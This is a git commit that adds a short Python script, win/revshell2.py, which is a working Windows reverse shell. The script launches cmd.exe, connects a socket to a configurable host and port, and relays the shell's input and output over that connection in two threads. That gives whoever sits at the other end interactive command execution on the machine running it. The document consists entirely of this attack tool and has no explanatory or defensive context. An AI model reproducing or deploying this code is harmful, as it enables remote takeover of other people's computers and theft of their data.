47cb7c29bcbd4ab6191566c12132aff8ff242b4e
hunter87 <83773586+Hunter87ff@users.noreply.github.com>
2024-08-07 22:11:11 +0530

    Create revshell2.py
    Former-commit-id: 3681b5e56039ded647535a5942802ef27925276b

---
+++ win/revshell2.py
@@ -0,0 +1,18 @@
+import socket,os as os,threading
+import subprocess as sp
+
+def run(host:str="localhost", port:int=8787):
+    p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT)
+    s=socket.socket();s.connect((host,port))
+    def c2s():
+        while True:
+            o=os.read(p.stdout.fileno(),1024)
+            s.send(o)
+    def s2c():
+        while True:
+            i=s.recv(1024)
+            os.write(p.stdin.fileno(),i)
+
+    threading.Thread(target=c2s).start()
+    threading.Thread(target=s2c).start()
+
